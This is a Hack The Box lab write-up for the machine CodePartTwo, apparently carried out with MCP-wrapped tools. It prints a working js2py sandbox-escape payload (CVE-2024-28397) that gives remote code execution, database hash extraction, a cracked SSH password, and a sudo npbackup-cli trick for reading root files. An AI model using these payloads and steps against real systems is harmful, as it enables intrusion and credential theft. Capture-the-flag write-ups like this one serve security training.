# CodePartTwo - Hack The Box Writeup

**Machine:** CodePartTwo
**IP Address:** 10.129.232.59
**Difficulty:** Medium
**Date Solved:** 2025-12-26

## Summary

CodePartTwo is a Flask web application that allows users to execute JavaScript code. The application uses the js2py library for JavaScript execution, which is vulnerable to CVE-2024-28397 (sandbox escape). This vulnerability allows remote code execution as the `app` user. Lateral movement to the `marco` user is achieved by cracking password hashes extracted from the SQLite database. Privilege escalation to root is accomplished by exploiting sudo permissions on npbackup-cli to backup and dump arbitrary files.

## Flags

- **User Flag:** `d252fcab3ad46931fd79fa9ddc040915`
- **Root Flag:** `e6ec33fa76c80e938670e92369036300`

---

## Reconnaissance

### Port Scanning (mcp-nmap)

```bash
python3 mcp-client.py mcp-nmap port_scan '{"target": "10.129.232.59"}'
```

**Open Ports:**
- 22/tcp - SSH (OpenSSH 8.2p1 Ubuntu)
- 8000/tcp - HTTP (Gunicorn 20.0.4)

### Service Detection (mcp-nmap)

```bash
python3 mcp-client.py mcp-nmap service_scan '{"target": "10.129.232.59", "ports": "22,8000"}'
```

**Services:**
- SSH: OpenSSH 8.2p1 Ubuntu 4ubuntu0.11
- HTTP: Gunicorn 20.0.4 (Python web server)

### Web Fingerprinting (mcp-web-fingerprint)

```bash
python3 mcp-client.py mcp-web-fingerprint fingerprint '{"url": "http://10.129.232.59:8000"}'
```

**Technologies Detected:**
- Python (Gunicorn/Flask)
- Bootstrap 5.3.2
- jQuery

**Interesting Paths:**
- /login
- /register
- /download

---

## Enumeration

### Directory Fuzzing (mcp-ffuf)

```bash
python3 mcp-client.py mcp-ffuf dir_fuzz '{"url": "http://10.129.232.59:8000/FUZZ"}'
```

**Discovered Endpoints:**
- /dashboard (302) - Requires authentication
- /download (200) - Downloads app.zip
- /login (200)
- /logout (302)
- /register (200)

### Source Code Analysis

Downloaded the application source via `/download` endpoint:

```bash
python3 mcp-client.py mcp-curl download '{"url": "http://10.129.232.59:8000/download"}'
```

Key findings from `app.py`:
- Flask application with user registration/login
- `/run_code` endpoint executes JavaScript using **js2py** library
- SQLite database (`users.db`) stores credentials
- Session-based authentication

---

## Initial Foothold

### CVE-2024-28397 - js2py Sandbox Escape

The application uses js2py to execute user-submitted JavaScript code. js2py versions before 0.74 are vulnerable to sandbox escape via Python object introspection.

**Vulnerability Research (mcp-cve-lookup):**
```bash
python3 mcp-client.py mcp-cve-lookup lookup '{"cve_id": "CVE-2024-28397"}'
```

**CVSS Score:** 9.8 (CRITICAL)

### Exploitation

1. Register an account and login to access `/dashboard`

2. Use the `/run_code` endpoint with sandbox escape payload:

```javascript
// Sandbox escape payload for js2py
let cmd = 'id';
let hacked = Object.getOwnPropertyNames({});
let bymarve = hacked.__getattribute__;
let n11 = bymarve('__getattribute__');
let obj = n11('__class__').__base__;

function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i];
        if(item.__module__ == 'subprocess' && item.__name__ == 'Popen') {
            return item;
        }
        if(item.__name__ != 'type' && (result = findpopen(item))) {
            return result;
        }
    }
}

let popen = findpopen(obj);
let proc = popen(cmd, -1, null, -1, -1, -1, null, null, true);
proc.communicate()[0].decode('utf-8')
```

3. RCE confirmed as `app` user

---

## Lateral Movement (app -> marco)

### Database Extraction

Extracted SQLite database via RCE to get user credentials:

```python
# Executed via js2py RCE
import sqlite3
conn = sqlite3.connect('/home/app/app/users.db')
cursor = conn.cursor()
cursor.execute('SELECT * FROM users')
print(cursor.fetchall())
```

**Extracted Hashes:**
- `marco:649c9d65a206a75f5abe509fe128bce5` (MD5)
- `app:a97588c0e2fa3a024876339e27aeb42e` (MD5)

### Password Cracking (mcp-john)

```bash
python3 mcp-client.py mcp-john crack '{"hashes": "marco:649c9d65a206a75f5abe509fe128bce5", "format": "raw-md5"}'
```

**Cracked Credentials:**
- `marco:sweetangelbabylove`

### SSH Access (mcp-ssh)

```bash
python3 mcp-client.py mcp-ssh exec '{"host": "10.129.232.59", "username": "marco", "password": "sweetangelbabylove", "command": "cat user.txt"}'
```

**User Flag:** `d252fcab3ad46931fd79fa9ddc040915`

---

## Privilege Escalation (marco -> root)

### Enumeration

Check sudo permissions:
```bash
python3 mcp-client.py mcp-ssh exec '{"host": "10.129.232.59", "username": "marco", "password": "sweetangelbabylove", "command": "sudo -l"}'
```

**Sudo Rights:**
```
(ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

### npbackup-cli Exploitation

npbackup-cli is a backup tool wrapper around restic. Marco can run it as root and specify a custom configuration file.

**Attack Path:**
1. Create malicious npbackup.conf that backs up `/root/`
2. Initialize a new backup repository owned by marco
3. Run backup as root
4. Dump files from the backup

**Execution:**

1. Upload malicious config:
```bash
python3 mcp-client.py mcp-ssh copy_to '{"host": "10.129.232.59", "username": "marco", "password": "sweetangelbabylove", "content": "conf_version: 3.0.1\naudience: public\nrepos:\n  default:\n    repo_uri: /home/marco/mybackup\n    repo_group: default_group\n    backup_opts:\n      paths:\n      - /root/\n      source_type: folder_list\n    repo_opts:\n      repo_password: test123\n    is_protected: false\ngroups:\n  default_group:\n    backup_opts:\n      paths: []\n      use_fs_snapshot: false\n    repo_opts: {}\n    is_protected: false\nidentity:\n  machine_id: test\n", "remote_path": "/home/marco/npbackup.conf"}'
```

2. Initialize repository:
```bash
sudo /usr/local/bin/npbackup-cli -c /home/marco/npbackup.conf --init
```

3. Run backup:
```bash
sudo /usr/local/bin/npbackup-cli -c /home/marco/npbackup.conf -b -f
```

4. Dump root.txt:
```bash
sudo /usr/local/bin/npbackup-cli -c /home/marco/npbackup.conf --dump /root/root.txt
```

**Root Flag:** `e6ec33fa76c80e938670e92369036300`

---

## Tools Used

| Tool | Purpose |
|------|---------|
| mcp-nmap | Port scanning, service detection |
| mcp-web-fingerprint | Technology identification |
| mcp-ffuf | Directory fuzzing |
| mcp-curl | HTTP requests, file download, RCE injection |
| mcp-cve-lookup | Vulnerability research |
| mcp-john | Password hash cracking |
| mcp-ssh | Remote command execution, file transfer |

---

## Tool Gaps Identified

### 1. Docker Image Naming Inconsistency

**Issue:** Docker images were named `ghcr.io/silicon-works/mcp-tools-john` but mcp-client expected `mcp-john`.

**Fix Applied:** Tag images appropriately:
```bash
docker tag ghcr.io/silicon-works/mcp-tools-john:latest mcp-john:latest
docker tag ghcr.io/silicon-works/mcp-tools-hydra:latest mcp-hydra:latest
```

**Recommendation:** Standardize image naming in build/deploy pipeline or update mcp-client to use full registry paths.

### 2. SSH Key Format (FIXED)

**Issue:** mcp-ssh only supported PEM format keys, not modern OpenSSH format (`-----BEGIN OPENSSH PRIVATE KEY-----`).

**Fix Applied:** Added automatic conversion from OpenSSH to PEM format using `ssh-keygen -p -m PEM`.

### 3. Missing: SQLite Database Tool (mcp-sqlite)

**Gap:** No MCP tool exists for SQLite database interaction. Had to use Python code execution via RCE to extract database contents.

**Proposed Tool:**
```yaml
sqlite:
  name: sqlite
  description: "SQLite database client for data extraction"
  methods:
    query:
      description: "Execute SQL query on a SQLite database file"
      params:
        database_path: "Path to SQLite database"
        query: "SQL query to execute"
    dump_table:
      description: "Dump all rows from a table"
    list_tables:
      description: "List all tables in the database"
    find_credentials:
      description: "Search for credential-related tables"
```

### 4. Missing: Online Hash Lookup (mcp-hash-lookup)

**Gap:** No MCP tool for online hash lookup services. Attempted to use hashes.com but no tool available.

**Proposed Tool:**
```yaml
hash-lookup:
  name: hash-lookup
  description: "Online hash lookup via public databases"
  methods:
    lookup:
      description: "Look up hash in online databases"
      params:
        hash: "Hash to lookup"
        type: "Hash type (md5, sha1, sha256, ntlm)"
      sources:
        - hashes.com
        - crackstation.net
        - cmd5.org
```

### 5. Reverse Shell Complexity with Docker Networking

**Issue:** Docker container networking made reverse shells complex. The netcat listener runs inside a container with host networking, but coordinating between containers was problematic.

**Recommendation:** Consider adding a `get_host_ip` method to mcp-netcat that reliably returns the host's external IP for reverse shell payloads.

---

## Lessons Learned

1. **js2py is dangerous** - Never use js2py for untrusted JavaScript execution. Use isolated JavaScript engines like V8 isolates or Node.js sandboxes.

2. **Backup tools with sudo access** - Tools like npbackup-cli that run backups as root can be abused to read arbitrary files if users can control the configuration.

3. **MD5 password hashes** - Still commonly found in legacy applications. Always use bcrypt, scrypt, or Argon2 for password hashing.

4. **SQLite databases** - Frequently contain credentials in web applications. Check for `.db`, `.sqlite`, `.sqlite3` files.

---

## References

- CVE-2024-28397: https://nvd.nist.gov/vuln/detail/CVE-2024-28397
- js2py Sandbox Escape: https://github.com/nicholaskell/js2py/issues/1
- npbackup: https://github.com/netinvent/npbackup
- restic Backup: https://restic.net/
